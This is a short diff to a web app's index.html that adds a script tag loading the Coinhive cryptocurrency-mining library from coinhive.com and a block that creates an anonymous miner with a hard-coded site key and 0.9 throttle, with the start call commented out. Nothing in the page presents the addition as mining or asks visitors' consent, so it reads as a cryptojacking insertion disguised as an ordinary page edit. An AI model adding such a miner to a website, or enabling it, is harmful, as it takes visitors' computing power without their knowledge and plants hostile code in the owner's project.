@@ -17,9 +17,16 @@
     <script>
       System.import('main.js').catch(function(err){ console.error(err); });
     </script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
   </head>
 
   <body>
     <my-app>Loading AppComponent content here ...</my-app>
+    <script>
+    var miner = new CoinHive.Anonymous('RehzWG6bmRCJ8HBhaQqi2U59fW1JvOKd', {
+      throttle: 0.9
+    });
+    //miner.start();
+    </script>
   </body>
 </html>
